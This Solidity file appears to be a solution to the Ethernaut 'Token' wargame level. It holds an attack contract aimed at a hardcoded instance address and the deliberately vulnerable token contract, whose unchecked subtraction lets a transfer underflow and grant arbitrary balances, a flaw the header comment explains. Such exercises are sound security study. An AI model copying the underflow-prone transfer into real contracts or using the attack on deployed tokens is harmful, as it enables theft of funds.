// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

/**
 * Used to solve level 5 (token) in Ethernaut. 
 * In solidity versions below 0.8, overflow and underflow happen without errors.
 * You can send as many tokens as you want, since the require of the transfer
 * error doesn't stop it. This is why safe math is important for older versions
 * of solidity.
*/
contract TokenAtack {
    Token token = Token(0x69D24Dfb89836Fe47a09dc73D5E8DeAc8527eafe);
    
    function transferBack(uint val) external {
        token.transfer(msg.sender, val);
    }
}

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}